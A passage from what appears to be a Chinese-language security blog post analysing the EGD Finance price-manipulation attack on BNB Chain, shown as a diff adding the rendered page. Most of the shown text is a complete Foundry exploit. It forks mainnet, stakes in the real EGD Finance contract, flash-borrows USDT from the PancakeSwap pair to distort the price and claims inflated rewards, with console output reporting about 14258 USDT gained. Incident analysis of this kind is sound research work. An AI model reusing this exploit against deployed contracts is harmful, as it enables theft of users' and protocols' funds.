+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IEGD_Finance</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getEGDPrice</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">calculateAll</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">bond</span><span class="p">(</span><span class="kt">address</span> <span class="n">invitor</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">stake</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">claimAllReward</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="k">from</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="nb">value</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IPancakeRouter</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swapExactTokensForTokensSupportingFeeOnTransferTokens</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amountOutMin</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">deadline</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">EGD_Finance</span> <span class="o">=</span> <span class="mh">0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">usdt</span> <span class="o">=</span> <span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">egd</span> <span class="o">=</span> <span class="mh">0x202b233735bF743FA31abb8f71e641970161bF98</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="k">constant</span> <span class="n">blockheight</span> <span class="o">=</span> <span class="mi">20245522</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">IPancakePair</span> <span class="k">constant</span> <span class="n">EGD_USDT_LPPool</span> <span class="o">=</span> <span class="n">IPancakePair</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xa361433E409Adac1f87CDF133127585F8a93c67d</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">IPancakeRouter</span> <span class="k">constant</span> <span class="n">pancakeRouter</span> <span class="o">=</span> <span class="n">IPancakeRouter</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="k">payable</span><span class="p">(</span><span class="mh">0x10ED43C718714eb63d5aA57B78B54704E256024E</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Egd2USDT</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swap2usdt</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//将egd兑换成usdt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">egd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">usdt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pancakeRouter</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pancakeRouter</span><span class="p">.</span><span class="n">swapExactTokensForTokensSupportingFeeOnTransferTokens</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">HackTest2</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IEGD_Finance</span> <span class="n">egd_finance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Egd2USDT</span> <span class="n">egd2usdt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;https://rpc.ankr.com/bsc&#34;</span><span class="p">,</span> <span class="n">blockheight</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span> <span class="o">=</span> <span class="n">IEGD_Finance</span><span class="p">(</span><span class="n">EGD_Finance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egd2usdt</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Egd2USDT</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deal</span><span class="p">(</span><span class="n">usdt</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">30000</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testHack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">stake</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//模拟2天后
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//贷款（价格操纵）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">99997600</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100000000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">EGD_USDT_LPPool</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">borrowUSDT</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;abcd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//将获得的egd换成usdt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;i will apporve all edg coin to another contract:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">egd2usdt</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">egd2usdt</span><span class="p">.</span><span class="n">swap2usdt</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;earned usdt:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">-</span> <span class="n">balanceBefore</span><span class="p">)</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">ether</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">stake</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">bond</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x85cbfaBD709c744C84A36BA47145396d724EE751</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">egd_finance</span><span class="p">),</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">stake</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//贷款的回调函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">count1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//在价格不合理的时候领取质押奖励
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//归还贷款本金 + 5%手续费
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">fee</span> <span class="o">=</span> <span class="p">(</span><span class="n">count1</span> <span class="o">*</span> <span class="mi">500</span><span class="n">_000_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">count1</span> <span class="o">+</span> <span class="n">fee</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">~/Desktop/EGDFinanceDemo main !2 9 ❯ forge test --match-contract HackTest2 -vv
+</span></span><span class="line"><span class="cl">[⠑] Compiling...
+</span></span><span class="line"><span class="cl">[⠆] Compiling 1 files with 0.8.17
+</span></span><span class="line"><span class="cl">[⠔] Solc 0.8.17 finished in 2.58s
+</span></span><span class="line"><span class="cl">Compiler run successful
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Running 1 test for test/Hack2.t.sol:HackTest2
+</span></span><span class="line"><span class="cl">[PASS] testHack() (gas: 1074481)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  i will apporve all edg coin to another contract: 5630136207606302655330000
+</span></span><span class="line"><span class="cl">  earned usdt (ether): 14258
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Test result: ok. 1 passed; 0 failed; finished in 666.79ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>套现 14258 $</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-03-06</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/analyse_of_egd_finance_attack/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析" data-hashtags="defi"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-hashtag="defi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/defi/">defi</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/evm-puzzles/" class="prev" rel="prev" title="Evm Puzzles"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Evm Puzzles</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yinhui1984" target="_blank">zhouyinhui</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":200},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
